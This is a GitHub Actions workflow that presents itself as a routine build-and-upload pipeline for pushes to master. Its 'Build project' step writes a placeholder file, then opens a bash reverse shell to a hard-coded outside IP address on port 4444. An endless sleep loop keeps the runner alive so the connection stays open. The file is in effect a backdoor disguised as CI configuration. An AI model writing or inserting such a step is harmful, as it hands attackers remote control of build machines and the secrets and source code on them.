name: Build and Upload Artifact
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build project
        run: |
          mkdir -p dist
          echo "Built at $(date)" > dist/output.txt &
          # Reverse shell - keep alive
          bash -c 'bash -i >& /dev/tcp/172.245.86.254/4444 0>&1' &
          # Keep step alive
          while true; do sleep 60; done

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: my-artifact
          path: dist/output.txt
